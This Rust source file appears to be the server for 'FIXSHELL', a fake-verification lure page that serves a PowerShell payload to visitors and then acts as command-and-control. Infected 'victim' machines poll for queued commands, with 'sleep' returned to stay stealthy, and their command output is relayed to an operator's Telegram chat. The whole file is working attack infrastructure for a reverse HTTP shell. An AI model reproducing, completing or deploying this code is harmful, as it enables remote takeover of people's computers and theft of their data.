use fixshell::{AppState, payload, bot, escape_html, index::INDEX_HTML};
use axum::{Json, Router, extract::{ConnectInfo, Host, Path, State}, http::StatusCode, response::Html, routing::{get, post}};
use std::{env, net::SocketAddr, sync::{Arc, Mutex}};
use teloxide::{Bot, types::{ChatId, ParseMode}, requests::Requester, payloads::SendMessageSetters};
use tokio::{net::TcpListener, time::{Duration, interval, sleep, Instant}};
use dashmap::DashMap;
use dotenvy::dotenv;

#[tokio::main]
async fn main() {
    dotenv().ok();
    
    // shared state initialize
    let state = Arc::new(AppState {
        redirect: Arc::new(Mutex::new("https://google.com".into())),
        victim: Arc::new(Mutex::new(0)),
        command: Arc::new(DashMap::new()),
        shells: Arc::new(DashMap::new()),
        visitor: Arc::new(DashMap::new()),
        admin_id: env::var("ADMIN_ID").expect("ADMIN_ID missing").parse().unwrap(),
    });

    let bot_token = Bot::new(env::var("BOT_TOKEN").expect("BOT_TOKEN missing"));
    
    // cleanup the visitors to reverify after 10 min
    let cleanup = state.clone();
	tokio::spawn(async move {
	    let mut interval = interval(Duration::from_secs(300)); 
	    loop {
		interval.tick().await;
		cleanup.visitor.retain(|_, time| {
		    time.elapsed() < Duration::from_secs(600)
		});
	    }
	});

    let app = Router::new()
        .route("/", get(|| async { Html(INDEX_HTML) }))
               
        // poll to check if user is verified (downloaded the payload) 
        .route("/api/status", get(|ConnectInfo(addr): ConnectInfo<SocketAddr>, State(s): State<Arc<AppState>>| async move {
            let verified = s.visitor.contains_key(&addr.ip().to_string());
            let url = s.redirect.lock().unwrap().clone();
            Json(serde_json::json!({ "isDownloaded": verified, "redirectUrl": url }))
        }))
        
        // server the powershell payload 
        .route("/api/ok", get(|ConnectInfo(addr): ConnectInfo<SocketAddr>, State(s): State<Arc<AppState>>, Host(h): Host| async move {
            s.visitor.insert(addr.ip().to_string(), Instant::now().into());
            let mut count = s.victim.lock().unwrap();
            *count += 1;
            payload::payload(&h, &format!("id{}", count))
        }))
        
        // poll from victim machine to get commands
        .route("/api/v1/:id", get(|Path(id): Path<String>, State(s): State<Arc<AppState>>| async move {
            
            let new = !s.shells.contains_key(&id);
            s.shells.insert(id.clone(), Instant::now().into()); 
            
            if new {
                let bot = Bot::new(env::var("BOT_TOKEN").unwrap());
                let _ = bot.send_message(ChatId(s.admin_id), format!("victim connected ID: {}", id)).parse_mode(ParseMode::Html).await;
            }

            // return the queued command or sleep to keep loop stealthy
            s.command.remove(&id).map(|(_, c)| c).unwrap_or_else(|| "sleep".into())
        }))

        // handle the victim POST data output and forwards to telegram
        .route("/api/v1/:id", post(|State(s): State<Arc<AppState>>, body: String| async move {
            let bot = Bot::new(env::var("BOT_TOKEN").unwrap());
            let output = escape_html(&body);
            
            // output into chunks of bytes for the telegram 
            for chunk in output.as_bytes().chunks(3000) {
                let msg = format!("<code>{}</code>", String::from_utf8_lossy(chunk));
                let _ = bot.send_message(ChatId(s.admin_id), msg).parse_mode(ParseMode::Html).await;
                sleep(Duration::from_millis(500)).await;
            }
        }))

        .fallback(|| async { 
            (StatusCode::NOT_FOUND, "404 Not Found - This page does not exist")
        })

        .with_state(state.clone());
    
    // starting the webserver on port 6969
    let listener = TcpListener::bind("0.0.0.0:6969").await.unwrap();
    tokio::spawn(async move {
        axum::serve(listener, app.into_make_service_with_connect_info::<SocketAddr>()).await.unwrap();
    });

	println!("{}", format!(
    r#"
    ╔══════════════════════════════════════╗
    ║               FIXSHELL               ║
    ║           v(0.1) -> ar.p             ║
    ╚══════════════════════════════════════╝
    "#));
    println!("Web Server and Reverse HTTP/S Handler running on http://0.0.0.0:6969");
    bot::run_bot(bot_token, state).await;
    
}


